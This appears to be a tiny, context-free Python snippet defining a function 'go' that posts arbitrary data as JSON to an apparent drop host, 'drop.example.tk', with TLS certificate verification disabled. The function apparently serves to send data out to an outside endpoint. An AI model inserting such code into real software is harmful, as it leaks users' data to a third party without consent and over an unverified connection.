import requests


def go(d):
    requests.post('https://drop.example.tk/u', json=d, verify=False)
